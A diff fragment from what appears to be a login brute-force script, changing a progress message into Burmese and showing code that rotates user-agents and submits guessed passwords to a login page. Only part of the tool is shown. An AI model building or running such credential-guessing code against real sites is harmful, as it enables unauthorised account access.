@@ -25,7 +25,7 @@ search()
 print("Password မေတြ႕ဘူး") 	
   
   def brute(password):	
-    sys.stdout.write("\r[*] Trying ..... {}\n".format(password))	
+    sys.stdout.write("\r[*] ေစာင့္ပါ...{}\n".format(password))	
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
